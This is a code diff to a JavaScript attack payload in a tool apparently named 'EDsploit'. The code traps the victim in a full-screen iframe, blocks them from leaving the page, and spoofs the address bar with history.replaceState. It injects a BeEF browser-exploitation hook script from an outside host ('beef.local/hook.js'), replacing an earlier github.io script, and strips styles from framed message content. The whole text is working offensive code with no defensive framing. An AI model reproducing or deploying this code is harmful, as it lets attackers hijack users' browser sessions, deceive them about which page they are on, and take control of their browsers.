@@ -51,7 +51,7 @@ async function payload() {
 	window.top.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
 
 	const i = window.top.document.createElement('iframe');
-	i.src = "/";
+	i.src = `/`;
 	i.className = 'EDsploit';
 	i.style.cssText = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
 	window.top.document.body.appendChild(i);
@@ -62,9 +62,18 @@ async function payload() {
 			if (!doc) return;
 
 			const beef = doc.createElement('script');
-			beef.src = 'https://exon-dv.github.io/a/b.js';
+			beef.src = 'https://beef.local/hook.js'; //scan port 4900
 			beef.async = true;
 			doc.body.appendChild(beef);
+			setInterval(() => {
+				if (window.top.location.href !== i.contentWindow.location.href) {
+					window.top.history.replaceState({}, '', i.contentWindow.location.href);
+				}
+				const parent = i.contentWindow.document.querySelector('.view-message.printable-message.ck-content');
+				if (!parent) return;
+				const styles = parent.querySelectorAll(':scope > style');
+				styles.forEach(s => s.remove());
+			}, 500);
 
 			await new Promise(resolve => setTimeout(resolve, 8000));
 
@@ -95,12 +104,6 @@ async function payload() {
 			const observer = new MutationObserver(() => attachListeners(doc));
 			observer.observe(doc.body, { childList: true, subtree: true });
 			attachListeners(doc);
-			setInterval(() => {
-				if (window.top.location.href !== i.contentWindow.location.href) {
-					window.top.history.replaceState({}, '', i.contentWindow.location.href);
-				}
-			}, 500);
-
 		} catch (err) {
 			console.error('iframe hook failed', err);
 		}
